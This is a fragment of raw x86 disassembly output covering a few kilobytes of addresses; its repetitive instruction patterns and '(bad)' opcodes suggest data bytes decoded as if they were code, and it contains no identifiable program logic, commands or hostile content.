  441e1a:	inc    DWORD PTR [eax]
  441e1c:	add    BYTE PTR [edx-0x1],dl
  441e1f:	add    BYTE PTR [eax],al
  441e21:	dec    ebp
  441e22:	inc    DWORD PTR [eax]
  441e24:	add    BYTE PTR [ebp-0x1],al
  441e27:	add    BYTE PTR [eax],al
  441e29:	cmp    bh,bh
  441e2b:	add    BYTE PTR [eax],al
  441e2d:	xor    bh,bh
  441e2f:	add    BYTE PTR [eax],al
  441e31:	and    eax,0x1b0000ff
  441e36:	inc    DWORD PTR [eax]
  441e38:	add    BYTE PTR ds:0x140000ff,dl
  441e3e:	inc    DWORD PTR [eax]
  441e40:	add    BYTE PTR [esi],dl
  441e42:	inc    DWORD PTR [eax]
  441e44:	add    BYTE PTR [edi],dl
  441e46:	inc    DWORD PTR [eax]
  441e48:	add    BYTE PTR [edi],dl
  441e4a:	inc    DWORD PTR [eax]
  441e4c:	add    BYTE PTR [ebx],bl
  441e4e:	inc    DWORD PTR [eax]
  441e50:	add    BYTE PTR [edx],bl
  441e52:	inc    DWORD PTR [eax]
  441e54:	add    BYTE PTR ds:0x130000ff,dl
  441e5a:	inc    DWORD PTR [eax]
  441e5c:	add    BYTE PTR [ebx],dl
  441e5e:	inc    DWORD PTR [eax]
  441e60:	add    BYTE PTR [ebx],dl
  441e62:	inc    DWORD PTR [eax]
  441e64:	add    BYTE PTR [eax],dl
  441e66:	inc    DWORD PTR [eax]
  441e68:	add    BYTE PTR [edi+edi*8],ah
  441e6b:	add    BYTE PTR [eax],al
  441e6d:	cmp    edi,edi
  441e6f:	add    BYTE PTR [eax],al
  441e71:	arpl   di,di
  441e73:	add    BYTE PTR [eax],al
  441e75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  441e76:	inc    DWORD PTR [eax]
  441e78:	push   ss
  441e79:	out    dx,eax
  441e7a:	dec    DWORD PTR [edx]
  441e7c:	and    al,0xdd
  441e7e:	call   FWORD PTR [ecx]
  441e80:	sbb    eax,0x1b0fff6d
  441e85:	ja     0x441e86
  441e87:	adc    ecx,DWORD PTR [edi]
  441e89:	sub    bh,bh
  441e8b:	and    BYTE PTR [ecx],ah
  441e8d:	dec    edx
  441e8e:	dec    DWORD PTR [eax]
  441e90:	or     bl,BYTE PTR [eax]
  441e92:	dec    DWORD PTR [ecx*1+0x1a13ff2b]
  441e99:	cmp    edi,edi
  441e9b:	adc    BYTE PTR [edi],dl
  441e9d:	cmp    bh,bh
  441e9f:	or     eax,0xdff150d
  441ea4:	adc    al,0x50
  441ea6:	inc    DWORD PTR [eax]
  441ea8:	add    bl,ch
  441eaa:	inc    DWORD PTR [eax]
  441eac:	add    BYTE PTR [ecx+0x720000ff],ch
  441eb2:	inc    DWORD PTR [eax]
  441eb4:	add    BYTE PTR [ebp-0x1],al
  441eb7:	add    BYTE PTR [eax],al
  441eb9:	inc    DWORD PTR es:[eax]
  441ebc:	add    BYTE PTR [esi],dl
  441ebe:	inc    DWORD PTR [eax]
  441ec0:	add    BYTE PTR [ebx],dl
  441ec2:	inc    DWORD PTR [eax]
  441ec4:	add    BYTE PTR [eax],dl
  441ec6:	inc    DWORD PTR [eax]
  441ec8:	add    BYTE PTR [edi],cl
  441eca:	inc    DWORD PTR [eax]
  441ecc:	add    BYTE PTR [edi],cl
  441ece:	inc    DWORD PTR [eax]
  441ed0:	add    BYTE PTR ds:0x100000ff,cl
  441ed6:	inc    DWORD PTR [eax]
  441ed8:	add    BYTE PTR [ebx],cl
  441eda:	inc    DWORD PTR [eax]
  441edc:	add    BYTE PTR [ecx],dl
  441ede:	inc    DWORD PTR [eax]
  441ee0:	add    BYTE PTR [ebx],cl
  441ee2:	inc    DWORD PTR [eax]
  441ee4:	add    BYTE PTR [edx],dl
  441ee6:	inc    DWORD PTR [eax]
  441ee8:	add    BYTE PTR [ebx],ah
  441eea:	inc    DWORD PTR [eax]
  441eec:	add    BYTE PTR [edi],bh
  441eee:	inc    DWORD PTR [eax]
  441ef0:	add    BYTE PTR [eax-0x1],dh
  441ef3:	add    BYTE PTR [esp+edi*4],al
  441ef6:	inc    DWORD PTR [ebx]
  441ef8:	add    eax,0x120effda
  441efd:	ins    BYTE PTR es:[edi],dx
  441efe:	inc    DWORD PTR [edi]
  441f00:	or     eax,0x708ff2c
  441f05:	xor    al,0xff
  441f07:	adc    edx,DWORD PTR [edi]
  441f09:	cmp    eax,0x351818ff
  441f0e:	dec    DWORD PTR ds:0x5ff2b10
  441f14:	push   es
  441f15:	adc    al,0xff
  441f17:	or     al,0x12
  441f19:	xchg   edx,eax
  441f1a:	jmp    DWORD PTR ds:0xaff4a24
  441f20:	push   es
  441f21:	xchg   edi,eax
  441f22:	inc    DWORD PTR [eax]
  441f24:	add    dh,ch
  441f26:	inc    DWORD PTR [eax]
  441f28:	push   es
  441f29:	aad    0xff
  441f2b:	add    BYTE PTR [edi],dl
  441f2d:	hlt    
  441f2e:	dec    DWORD PTR [eax]
  441f30:	or     eax,0xffce
  441f35:	outs   dx,BYTE PTR ds:[esi]
  441f36:	inc    DWORD PTR [eax]
  441f38:	add    BYTE PTR [edx-0x1],al
  441f3b:	add    BYTE PTR [eax],al
  441f3d:	sub    bh,bh
  441f3f:	add    BYTE PTR [eax],al
  441f41:	adc    eax,0x80000ff
  441f46:	inc    DWORD PTR [eax]
  441f48:	add    BYTE PTR [edx],cl
  441f4a:	inc    DWORD PTR [eax]
  441f4c:	add    BYTE PTR [esi],cl
  441f4e:	inc    DWORD PTR [eax]
  441f50:	add    BYTE PTR [edx],bl
  441f52:	inc    DWORD PTR [eax]
  441f54:	add    BYTE PTR [edi],dh
  441f56:	inc    DWORD PTR [eax]
  441f58:	add    BYTE PTR [ebp-0x1],bl
  441f5b:	add    DWORD PTR [edx],ecx
  441f5d:	xchg   ebp,eax
  441f5e:	inc    DWORD PTR [eax]
  441f60:	or     ecx,esp
  441f62:	inc    DWORD PTR [ecx]
  441f64:	push   cs
  441f65:	retf   
  441f66:	call   DWORD PTR [esi]
  441f68:	sbb    ebp,DWORD PTR [ebx-0x1]
  441f6b:	adc    bl,BYTE PTR [esi*2+0x712a1dff]
  441f72:	call   FWORD PTR [edi]
  441f74:	xor    al,0x8a
  441f76:	call   FWORD PTR ds:0x24ff8d36
  441f7c:	aaa    
  441f7d:	test   bh,bh
  441f7f:	sub    al,BYTE PTR [edx-0x7a]
  441f82:	jmp    FWORD PTR [ecx]
  441f84:	xor    BYTE PTR [ebp-0x1],dl
  441f87:	and    al,0x1c
  441f89:	inc    esp
  441f8a:	jmp    DWORD PTR [esi]
  441f8c:	and    eax,0x2125ff54
  441f91:	inc    esp
  441f92:	dec    DWORD PTR [esi]
  441f94:	pop    ss
  441f95:	(bad)  
  441f98:	adc    eax,esp
  441f9a:	jmp    DWORD PTR [eax]
  441f9c:	pop    ss
  441f9d:	lahf   
  441f9e:	inc    DWORD PTR [ebx]
  441fa0:	add    bl,dl
  441fa2:	inc    DWORD PTR [eax]
  441fa4:	add    BYTE PTR [ebp+0x560000ff],cl
  441faa:	inc    DWORD PTR [eax]
  441fac:	add    BYTE PTR [edi],ch
  441fae:	inc    DWORD PTR [eax]
  441fb0:	add    BYTE PTR [edi+edi*8],dl
  441fb3:	add    BYTE PTR [eax],al
  441fb5:	ud0    eax,DWORD PTR [eax]
  441fb8:	add    BYTE PTR [ebx],dl
  441fba:	inc    DWORD PTR [eax]
  441fbc:	add    BYTE PTR [eax],dl
  441fbe:	inc    DWORD PTR [eax]
  441fc0:	add    BYTE PTR [ecx],dl
  441fc2:	inc    DWORD PTR [eax]
  441fc4:	add    BYTE PTR [edx],dl
  441fc6:	inc    DWORD PTR [eax]
  441fc8:	add    BYTE PTR [edi],cl
  441fca:	inc    DWORD PTR [eax]
  441fcc:	add    BYTE PTR ds:0xf0000ff,cl
  441fd2:	inc    DWORD PTR [eax]
  441fd4:	add    BYTE PTR [ecx],dl
  441fd6:	inc    DWORD PTR [eax]
  441fd8:	add    BYTE PTR [esi],cl
  441fda:	inc    DWORD PTR [eax]
  441fdc:	add    BYTE PTR [ecx],dl
  441fde:	inc    DWORD PTR [eax]
  441fe0:	add    BYTE PTR [edx],dl
  441fe2:	inc    DWORD PTR [eax]
  441fe4:	add    BYTE PTR [eax],bl
  441fe6:	inc    DWORD PTR [eax]
  441fe8:	add    BYTE PTR [edi],dl
  441fea:	inc    DWORD PTR [eax]
  441fec:	add    BYTE PTR [ebx],bl
  441fee:	inc    DWORD PTR [eax]
  441ff0:	add    BYTE PTR [edi+edi*8],ah
  441ff3:	add    BYTE PTR [eax],al
  441ff5:	inc    DWORD PTR es:[eax]
  441ff8:	add    BYTE PTR [edx],ch
  441ffa:	inc    DWORD PTR [eax]
  441ffc:	add    BYTE PTR [edi],ch
  441ffe:	inc    DWORD PTR [eax]
  442000:	add    BYTE PTR [edi+edi*8],ch
  442003:	add    BYTE PTR [eax],al
  442005:	sub    edi,edi
  442007:	add    BYTE PTR [eax],al
  442009:	sub    eax,0x310000ff
  44200e:	inc    DWORD PTR [eax]
  442010:	add    BYTE PTR ds:0x2b0000ff,ch
  442016:	inc    DWORD PTR [eax]
  442018:	add    BYTE PTR [edx],dh
  44201a:	inc    DWORD PTR [eax]
  44201c:	add    BYTE PTR [esi],dh
  44201e:	inc    DWORD PTR [eax]
  442020:	add    BYTE PTR [edi+edi*8],ch
  442023:	add    BYTE PTR [eax],al
  442025:	daa    
  442026:	inc    DWORD PTR [eax]
  442028:	add    BYTE PTR [ebx],ah
  44202a:	inc    DWORD PTR [eax]
  44202c:	add    BYTE PTR [esi],bl
  44202e:	inc    DWORD PTR [eax]
  442030:	add    BYTE PTR ds:0x190000ff,bl
  442036:	inc    DWORD PTR [eax]
  442038:	add    BYTE PTR [edx],dl
  44203a:	inc    DWORD PTR [eax]
  44203c:	add    BYTE PTR [ebx],dl
  44203e:	inc    DWORD PTR [eax]
  442040:	add    BYTE PTR [edx],dl
  442042:	inc    DWORD PTR [eax]
  442044:	add    BYTE PTR ds:0x100000ff,cl
  44204a:	inc    DWORD PTR [eax]
  44204c:	add    BYTE PTR [edi],dl
  44204e:	inc    DWORD PTR [eax]
  442050:	add    BYTE PTR [edx],bl
  442052:	inc    DWORD PTR [eax]
  442054:	add    BYTE PTR [edi+edi*8],dl
  442057:	add    BYTE PTR [eax],al
  442059:	sbb    bh,bh
  44205b:	add    BYTE PTR [eax],al
  44205d:	push   ss
  44205e:	inc    DWORD PTR [eax]
  442060:	add    BYTE PTR ds:0x130000ff,dl
  442066:	inc    DWORD PTR [eax]
  442068:	add    BYTE PTR ds:0x3d0000ff,ah
  44206e:	inc    DWORD PTR [eax]
  442070:	add    BYTE PTR [edi-0x1],ah
  442073:	add    BYTE PTR [ecx],al
  442075:	mov    ds:0xf41c00ff,eax
  44207a:	call   DWORD PTR [ecx]
  44207c:	and    esi,eax
  44207e:	call   DWORD PTR [edx*1+0x1d06ff31]
  442085:	mov    cl,0xff
  442087:	and    BYTE PTR [eax],ah
  442089:	pop    eax
  44208a:	jmp    DWORD PTR [eax]
  44208c:	sbb    al,0x42
  44208e:	call   FWORD PTR [eax]
  442090:	sbb    dh,BYTE PTR [esi]
  442092:	inc    DWORD PTR [ebx+eax*1]
  442095:	adc    eax,0x42190aff
  44209a:	dec    DWORD PTR [ecx]
  44209c:	adc    DWORD PTR [eax],esi
  44209e:	call   DWORD PTR [ecx]
  4420a0:	or     eax,0xd0bff16
  4420a5:	pop    esi
  4420a6:	inc    DWORD PTR [eax]
  4420a8:	add    al,dl
  4420aa:	inc    DWORD PTR [eax]
  4420ac:	add    BYTE PTR [edi+edi*8-0x7d0000],bh
  4420b3:	add    BYTE PTR [eax],al
  4420b5:	push   esi
  4420b6:	inc    DWORD PTR [eax]
  4420b8:	add    BYTE PTR [esi],ch
  4420ba:	inc    DWORD PTR [eax]
  4420bc:	add    BYTE PTR [eax],ah
  4420be:	inc    DWORD PTR [eax]
  4420c0:	add    BYTE PTR [edi+edi*8],dl
  4420c3:	add    BYTE PTR [eax],al
  4420c5:	adc    bh,bh
  4420c7:	add    BYTE PTR [eax],al
  4420c9:	push   cs
  4420ca:	inc    DWORD PTR [eax]
  4420cc:	add    BYTE PTR [ecx],dl
  4420ce:	inc    DWORD PTR [eax]
  4420d0:	add    BYTE PTR [ebx],cl
  4420d2:	inc    DWORD PTR [eax]
  4420d4:	add    BYTE PTR [esi],cl
  4420d6:	inc    DWORD PTR [eax]
  4420d8:	add    BYTE PTR [ebx],cl
  4420da:	inc    DWORD PTR [eax]
  4420dc:	add    BYTE PTR ds:0xc0000ff,cl
  4420e2:	inc    DWORD PTR [eax]
  4420e4:	add    BYTE PTR [ebx],dl
  4420e6:	inc    DWORD PTR [eax]
  4420e8:	add    BYTE PTR [edi+edi*8],ah
  4420eb:	add    BYTE PTR [eax],al
  4420ed:	inc    ecx
  4420ee:	inc    DWORD PTR [eax]
  4420f0:	add    BYTE PTR [edi-0x1],ch
  4420f3:	add    BYTE PTR [eax],al
  4420f5:	mov    dl,0xff
  4420f7:	add    BYTE PTR [ecx],al
  4420f9:	mov    eax,0x8a0704ff
  4420fe:	inc    DWORD PTR [ebx]
  442100:	or     edx,DWORD PTR [edi]
  442102:	dec    DWORD PTR [ebx]
  442104:	push   cs
  442105:	cmp    bh,bh
  442107:	sbb    al,0x21
  442109:	dec    edi
  44210a:	call   FWORD PTR ds:0x1eff3e1e
  442110:	and    al,0x4c
  442112:	dec    DWORD PTR [ebx]
  442114:	adc    DWORD PTR [edi+edi*8],esi
  442117:	or     eax,0xaff200d
  44211c:	push   cs
  44211d:	lahf   
  44211e:	inc    DWORD PTR [eax]
  442120:	add    bh,ah
  442122:	inc    DWORD PTR [eax]
  442124:	push   es
  442125:	fdiv   st(7),st
  442127:	add    BYTE PTR [eax],al
  442129:	sar    edi,0x1
  44212c:	or     ebx,ecx
  44212e:	dec    DWORD PTR [edx]
  442130:	adc    eax,0xffcd
  442135:	push   edi
  442136:	inc    DWORD PTR [eax]
  442138:	add    BYTE PTR [esi],dh
  44213a:	inc    DWORD PTR [eax]
  44213c:	add    BYTE PTR [eax],ah
  44213e:	inc    DWORD PTR [eax]
  442140:	add    BYTE PTR [ebx],dl
  442142:	inc    DWORD PTR [eax]
  442144:	add    BYTE PTR [edi],al
  442146:	inc    DWORD PTR [eax]
  442148:	add    BYTE PTR [edi],al
  44214a:	inc    DWORD PTR [eax]
  44214c:	add    BYTE PTR [edi+edi*8],cl
  44214f:	add    BYTE PTR [eax],al
  442151:	and    bh,bh
  442153:	add    BYTE PTR [eax],al
  442155:	inc    DWORD PTR ds:[eax]
  442158:	add    BYTE PTR [edx-0x1],ch
  44215b:	or     BYTE PTR [esi],dl
  44215d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44215e:	inc    DWORD PTR [edx]
  442160:	or     eax,0x201effb4
  442165:	xor    edi,edi
  442167:	and    DWORD PTR [ebx],esp
  442169:	pop    ecx
  44216a:	call   DWORD PTR ds:0x17ff721d
  442170:	sub    edi,DWORD PTR [ebp-0x1]
  442173:	sbb    BYTE PTR [ecx],ch
  442175:	cmp    edi,0x19
  442178:	and    eax,0x2c1fff76
  44217d:	jg     0x44217e
  44217f:	pop    ss
  442180:	das    
  442181:	cmp    edi,0xff5c2e2a
  442187:	sub    BYTE PTR [edx+edi*1],bl
  44218a:	jmp    DWORD PTR [ecx]
  44218c:	pop    ss
  44218d:	cmp    al,0xff
  44218f:	and    bl,BYTE PTR [ecx]
  442191:	sub    al,0xff
  442193:	and    ah,BYTE PTR [edx]
  442195:	dec    edx
  442196:	inc    DWORD PTR [eax]
  442198:	sbb    bh,cl
  44219a:	inc    DWORD PTR [ecx]
  44219c:	adc    al,0xfc
  44219e:	inc    DWORD PTR ds:0xffaa07
  4421a4:	add    BYTE PTR [ebp+0x570000ff],cl
  4421aa:	inc    DWORD PTR [eax]
  4421ac:	add    BYTE PTR [edx],dh
  4421ae:	inc    DWORD PTR [eax]
  4421b0:	add    BYTE PTR [edx],bl
  4421b2:	inc    DWORD PTR [eax]
  4421b4:	add    BYTE PTR [eax],dl
  4421b6:	inc    DWORD PTR [eax]
  4421b8:	add    BYTE PTR [edi+edi*8],cl
  4421bb:	add    BYTE PTR [eax],al
  4421bd:	or     bh,bh
  4421bf:	add    BYTE PTR [eax],al
  4421c1:	or     al,0xff
  4421c3:	add    BYTE PTR [eax],al
  4421c5:	or     eax,0xc0000ff
  4421ca:	inc    DWORD PTR [eax]
  4421cc:	add    BYTE PTR ds:0x100000ff,cl
  4421d2:	inc    DWORD PTR [eax]
  4421d4:	add    BYTE PTR [edi],cl
  4421d6:	inc    DWORD PTR [eax]
  4421d8:	add    BYTE PTR [edi+edi*8],cl
  4421db:	add    BYTE PTR [eax],al
  4421dd:	push   cs
  4421de:	inc    DWORD PTR [eax]
  4421e0:	add    BYTE PTR [ecx],dl
  4421e2:	inc    DWORD PTR [eax]
  4421e4:	add    BYTE PTR [ebx],dl
  4421e6:	inc    DWORD PTR [eax]
  4421e8:	add    BYTE PTR ds:0x180000ff,dl
  4421ee:	inc    DWORD PTR [eax]
  4421f0:	add    BYTE PTR [eax],bl
  4421f2:	inc    DWORD PTR [eax]
  4421f4:	add    BYTE PTR ds:0x150000ff,dl
  4421fa:	inc    DWORD PTR [eax]
  4421fc:	add    BYTE PTR [eax],bl
  4421fe:	inc    DWORD PTR [eax]
  442200:	add    BYTE PTR [ebx],dl
  442202:	inc    DWORD PTR [eax]
  442204:	add    BYTE PTR [esi],dl
  442206:	inc    DWORD PTR [eax]
  442208:	add    BYTE PTR [esi],dl
  44220a:	inc    DWORD PTR [eax]
  44220c:	add    BYTE PTR [edi],dl
  44220e:	inc    DWORD PTR [eax]
  442210:	add    BYTE PTR ds:0x160000ff,dl
  442216:	inc    DWORD PTR [eax]
  442218:	add    BYTE PTR [eax],bl
  44221a:	inc    DWORD PTR [eax]
  44221c:	add    BYTE PTR [edi],dl
  44221e:	inc    DWORD PTR [eax]
  442220:	add    BYTE PTR [eax],bl
  442222:	inc    DWORD PTR [eax]
  442224:	add    BYTE PTR [edx],bl
  442226:	inc    DWORD PTR [eax]
  442228:	add    BYTE PTR [edi],dl
  44222a:	inc    DWORD PTR [eax]
  44222c:	add    BYTE PTR [esi],dl
  44222e:	inc    DWORD PTR [eax]
  442230:	add    BYTE PTR [edi+edi*8],dl
  442233:	add    BYTE PTR [eax],al
  442235:	adc    edi,edi
  442237:	add    BYTE PTR [eax],al
  442239:	adc    edi,edi
  44223b:	add    BYTE PTR [eax],al
  44223d:	adc    bh,bh
  44223f:	add    BYTE PTR [eax],al
  442241:	push   cs
  442242:	inc    DWORD PTR [eax]
  442244:	add    BYTE PTR [eax],dl
  442246:	inc    DWORD PTR [eax]
  442248:	add    BYTE PTR [ecx],dl
  44224a:	inc    DWORD PTR [eax]
  44224c:	add    BYTE PTR [edi],cl
  44224e:	inc    DWORD PTR [eax]
  442250:	add    BYTE PTR [edx],dl
  442252:	inc    DWORD PTR [eax]
  442254:	add    BYTE PTR [esi],dl
  442256:	inc    DWORD PTR [eax]
  442258:	add    BYTE PTR [ebx],dl
  44225a:	inc    DWORD PTR [eax]
  44225c:	add    BYTE PTR [ecx],dl
  44225e:	inc    DWORD PTR [eax]
  442260:	add    BYTE PTR [ecx],dl
  442262:	inc    DWORD PTR [eax]
  442264:	add    BYTE PTR [ebx],dl
  442266:	inc    DWORD PTR [eax]
  442268:	add    BYTE PTR [edi+edi*8],ah
  44226b:	add    BYTE PTR [eax],al
  44226d:	inc    DWORD PTR ds:[eax]
  442270:	add    BYTE PTR [eax-0x1],ch
  442273:	add    BYTE PTR [ebx],al
  442275:	mov    ds:0xfa2f07ff,eax
  44227a:	call   DWORD PTR [ecx]
  44227c:	push   ss
  44227d:	cwde   
  44227e:	call   DWORD PTR [ebx]
  442280:	sbb    al,0x42
  442282:	inc    DWORD PTR [ecx+ebx*1]
  442285:	jnp    0x442286
  442287:	add    eax,0x14ff8214
  44228c:	adc    DWORD PTR ds:0x3b1a1aff,esi
  442292:	call   DWORD PTR [ecx]
  442294:	pop    ss
  442295:	cmp    edi,edi
  442297:	pop    es
  442298:	adc    eax,0x1305ff41
  44229d:	cmp    edi,edi
  44229f:	or     eax,0xcff2d15
  4422a4:	adc    BYTE PTR [edi+edi*8],dh
  4422a7:	add    BYTE PTR [eax],al
  4422a9:	daa    
  4422aa:	inc    DWORD PTR [esi]
  4422ac:	sbb    ecx,DWORD PTR [edx-0x60fcff01]
  4422b2:	inc    DWORD PTR [eax]
  4422b4:	add    BYTE PTR [ebp-0x1],ah
  4422b7:	add    BYTE PTR [eax],al
  4422b9:	cmp    bh,bh
  4422bb:	add    BYTE PTR [eax],al
  4422bd:	and    al,0xff
  4422bf:	add    BYTE PTR [eax],al
  4422c1:	adc    bh,bh
  4422c3:	add    BYTE PTR [eax],al
  4422c5:	or     edi,edi
  4422c7:	add    BYTE PTR [eax],al
  4422c9:	adc    edi,edi
  4422cb:	add    BYTE PTR [eax],al
  4422cd:	push   cs
  4422ce:	inc    DWORD PTR [eax]
  4422d0:	add    BYTE PTR [edx],cl
  4422d2:	inc    DWORD PTR [eax]
  4422d4:	add    BYTE PTR [esi],cl
  4422d6:	inc    DWORD PTR [eax]
  4422d8:	add    BYTE PTR [esi],cl
  4422da:	inc    DWORD PTR [eax]
  4422dc:	add    BYTE PTR [ebx],cl
  4422de:	inc    DWORD PTR [eax]
  4422e0:	add    BYTE PTR [ecx],cl
  4422e2:	inc    DWORD PTR [eax]
  4422e4:	add    BYTE PTR [ebx],dl
  4422e6:	inc    DWORD PTR [eax]
  4422e8:	add    BYTE PTR [esi],ah
  4422ea:	inc    DWORD PTR [eax]
  4422ec:	add    BYTE PTR [ebx-0x1],al
  4422ef:	add    BYTE PTR [eax],al
  4422f1:	jae    0x4422f2
  4422f3:	add    BYTE PTR [ecx],al
  4422f5:	mov    bh,0xff
  4422f7:	add    al,BYTE PTR [esp+ecx*8]
  4422fa:	inc    DWORD PTR [eax]
  4422fc:	add    bh,dl
  4422fe:	inc    DWORD PTR [ebx+ecx*1]
  442301:	popa   
  442302:	inc    DWORD PTR [ebx]
  442304:	add    eax,0x1d1cff07
  442309:	inc    ebp
  44230a:	call   FWORD PTR [ebx]
  44230c:	and    BYTE PTR [edi+edi*8+0x1f],al
  442310:	and    eax,DWORD PTR [ebx-0x1]
  442313:	adc    al,0x1a
  442315:	xor    bh,bh
  442317:	adc    BYTE PTR [eax],dl
  442319:	push   cs
  44231a:	dec    DWORD PTR ds:0xff5c15
  442320:	add    eax,0xffdd
  442325:	(bad)  
  442326:	inc    DWORD PTR [eax]
  442328:	add    cl,al
  44232a:	inc    DWORD PTR [eax]
  44232c:	add    BYTE PTR [esi+0x6c0201ff],dl
  442332:	inc    DWORD PTR [eax]
  442334:	add    BYTE PTR [eax-0x1],al
  442337:	add    BYTE PTR [eax],al
  442339:	sub    edi,edi
  44233b:	add    BYTE PTR [eax],al
  44233d:	sbb    bh,bh
  44233f:	add    BYTE PTR [eax],al
  442341:	ud0    eax,DWORD PTR [eax]
  442344:	add    BYTE PTR [edi],al
  442346:	inc    DWORD PTR [eax]
  442348:	add    BYTE PTR [esi],al
  44234a:	inc    DWORD PTR [eax]
  44234c:	add    BYTE PTR [esi],cl
  44234e:	inc    DWORD PTR [eax]
  442350:	add    BYTE PTR [edx],ah
  442352:	inc    DWORD PTR [eax]
  442354:	add    BYTE PTR [esi],bh
  442356:	inc    DWORD PTR [eax]
  442358:	add    BYTE PTR [edx-0x1],dh
  44235b:	add    DWORD PTR [esi],ecx
  44235d:	mov    bh,0xff
  44235f:	or     DWORD PTR [edx],edx
  442361:	(bad)  
  442362:	jmp    FWORD PTR ds:0x21ff3226
  442368:	and    DWORD PTR [ebp-0x1],ecx
  44236b:	adc    ebx,DWORD PTR [eax]
  44236d:	push   ebx
  44236e:	call   DWORD PTR [edi]
  442370:	push   ds
  442371:	call   DWORD PTR [bp+si]
  442374:	and    BYTE PTR [ecx-0x1],dh
  442377:	adc    eax,0x13ff6a21
  44237c:	and    al,0x76
  44237e:	dec    DWORD PTR [ecx]
  442380:	and    DWORD PTR [ebp+0x7e3224ff],eax
  442386:	jmp    DWORD PTR [esi]
  442388:	es pop edi
  44238a:	call   FWORD PTR ds:0x19ff3112
  442390:	adc    al,0x2d
  442392:	call   FWORD PTR [esi]
  442394:	sbb    DWORD PTR [eax],esi
  442396:	inc    DWORD PTR [edx]
  442398:	sbb    eax,0x1c00ffb7
  44239d:	(bad)  
  44239e:	dec    DWORD PTR [eax]
  4423a0:	or     al,0xae
  4423a2:	inc    DWORD PTR [eax]
  4423a4:	add    BYTE PTR [ebx+0x570000ff],cl
  4423aa:	inc    DWORD PTR [eax]
  4423ac:	add    BYTE PTR [esi],ch
  4423ae:	inc    DWORD PTR [eax]
  4423b0:	add    BYTE PTR [edi],dl
  4423b2:	inc    DWORD PTR [eax]
  4423b4:	add    BYTE PTR [esi],cl
  4423b6:	inc    DWORD PTR [eax]
  4423b8:	add    BYTE PTR [esi],cl
  4423ba:	inc    DWORD PTR [eax]
  4423bc:	add    BYTE PTR [edi+edi*8],cl
  4423bf:	add    BYTE PTR [eax],al
  4423c1:	or     eax,0xb0000ff
  4423c6:	inc    DWORD PTR [eax]
  4423c8:	add    BYTE PTR ds:0xb0000ff,cl
  4423ce:	inc    DWORD PTR [eax]
  4423d0:	add    BYTE PTR [edx],cl
  4423d2:	inc    DWORD PTR [eax]
  4423d4:	add    BYTE PTR [edx],cl
  4423d6:	inc    DWORD PTR [eax]
  4423d8:	add    BYTE PTR [ebx],cl
  4423da:	inc    DWORD PTR [eax]
  4423dc:	add    BYTE PTR [edi+edi*8],cl
  4423df:	add    BYTE PTR [eax],al
  4423e1:	push   cs
  4423e2:	inc    DWORD PTR [eax]
  4423e4:	add    BYTE PTR [ecx],dl
  4423e6:	inc    DWORD PTR [eax]
  4423e8:	add    BYTE PTR [ebx],dl
  4423ea:	inc    DWORD PTR [eax]
  4423ec:	add    BYTE PTR [edi+edi*8],dl
  4423ef:	add    BYTE PTR [eax],al
  4423f1:	adc    edi,edi
  4423f3:	add    BYTE PTR [eax],al
  4423f5:	adc    al,0xff
  4423f7:	add    BYTE PTR [eax],al
  4423f9:	adc    eax,0x130000ff
  4423fe:	inc    DWORD PTR [eax]
  442400:	add    BYTE PTR [edi],cl
  442402:	inc    DWORD PTR [eax]
  442404:	add    BYTE PTR ds:0x90000ff,cl
  44240a:	inc    DWORD PTR [eax]
  44240c:	add    BYTE PTR [esi],cl
  44240e:	inc    DWORD PTR [eax]
  442410:	add    BYTE PTR ds:0xd0000ff,cl
  442416:	inc    DWORD PTR [eax]
  442418:	add    BYTE PTR [eax],dl
  44241a:	inc    DWORD PTR [eax]
  44241c:	add    BYTE PTR [ebx],cl
  44241e:	inc    DWORD PTR [eax]
  442420:	add    BYTE PTR ds:0xd0000ff,cl
  442426:	inc    DWORD PTR [eax]
  442428:	add    BYTE PTR [edi],cl
  44242a:	inc    DWORD PTR [eax]
  44242c:	add    BYTE PTR [eax],dl
  44242e:	inc    DWORD PTR [eax]
  442430:	add    BYTE PTR [edx],dl
  442432:	inc    DWORD PTR [eax]
  442434:	add    BYTE PTR [ebx],dl
  442436:	inc    DWORD PTR [eax]
  442438:	add    BYTE PTR [eax],dl
  44243a:	inc    DWORD PTR [eax]
  44243c:	add    BYTE PTR [edx],dl
  44243e:	inc    DWORD PTR [eax]
  442440:	add    BYTE PTR [ebx],dl
  442442:	inc    DWORD PTR [eax]
  442444:	add    BYTE PTR [edx],dl
  442446:	inc    DWORD PTR [eax]
  442448:	add    BYTE PTR [esi],cl
  44244a:	inc    DWORD PTR [eax]
  44244c:	add    BYTE PTR [edx],dl
  44244e:	inc    DWORD PTR [eax]
  442450:	add    BYTE PTR [ebx],dl
  442452:	inc    DWORD PTR [eax]
  442454:	add    BYTE PTR [edi+edi*8],dl
  442457:	add    BYTE PTR [eax],al
  442459:	adc    eax,0x100000ff
  44245e:	inc    DWORD PTR [eax]
  442460:	add    BYTE PTR [eax],dl
  442462:	inc    DWORD PTR [eax]
  442464:	add    BYTE PTR [esi],cl
  442466:	inc    DWORD PTR [eax]
  442468:	add    BYTE PTR [edi+edi*8],ah
  44246b:	add    BYTE PTR [eax],al
  44246d:	cmp    bh,bh
  44246f:	add    BYTE PTR [eax],al
  442471:	arpl   di,di
  442473:	add    BYTE PTR [edx],al
  442475:	mov    al,ds:0xea2606ff
  44247a:	inc    DWORD PTR [eax]
  44247c:	push   es
  44247d:	iret   
  44247e:	inc    DWORD PTR [eax]
  442480:	add    ebp,DWORD PTR [edi]
  442482:	call   DWORD PTR [edx]
  442484:	sub    eax,0x1206ffae
  442489:	inc    DWORD PTR fs:[eax]
  44248c:	add    BYTE PTR [ebx],bl
  44248e:	call   FWORD PTR [ecx+eiz*1]
  442491:	dec    eax
  442492:	call   FWORD PTR [esi]
  442494:	and    eax,0x1a10ff45
  442499:	cmp    eax,0x33150aff
  44249e:	inc    DWORD PTR [edi]
  4424a0:	adc    esi,DWORD PTR [ecx]
  4424a2:	inc    DWORD PTR [ecx]
  4424a4:	add    BYTE PTR ds:0xff,bl
  4424aa:	call   DWORD PTR ds:0x3ffa03e
  4424b0:	pand   mm7,mm7
  4424b3:	add    BYTE PTR [eax],al
  4424b5:	jne    0x4424b6
  4424b7:	add    BYTE PTR [eax],al
  4424b9:	dec    edx
  4424ba:	inc    DWORD PTR [eax]
  4424bc:	add    BYTE PTR [edi+edi*8],ah
  4424bf:	add    BYTE PTR [eax],al
  4424c1:	pop    ss
  4424c2:	inc    DWORD PTR [eax]
  4424c4:	add    BYTE PTR [ecx],dl
